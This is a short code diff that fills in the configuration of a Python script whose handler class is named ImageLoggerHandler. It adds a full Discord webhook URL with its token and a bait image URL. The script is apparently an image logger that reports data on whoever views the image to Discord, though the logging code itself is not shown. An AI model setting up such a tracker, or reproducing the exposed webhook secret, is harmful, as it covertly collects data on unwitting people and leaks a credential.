@@ -5,8 +5,8 @@ import requests
 import base64
 
 # --- CONFIGURATION ---
-WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"
-DEFAULT_IMAGE = "YOUR_IMAGE_URL_HERE" # z.B. https://i.imgur.com/example.png
+WEBHOOK_URL = "https://discord.com/api/webhooks/1553387456055746630/poeAGPGuJhnYqtBP3rFPxP1ns-_7w8237GamBKrqEkLDrNvtbApHV1w7fg_dyjZMA8oB"
+DEFAULT_IMAGE = "https://cdn.pixabay.com/photo/2023/07/04/08/31/cats-8105667_1280.jpg" # z.B. https://i.imgur.com/example.png
 # ---------------------
 
 class ImageLoggerHandler(BaseHTTPRequestHandler):
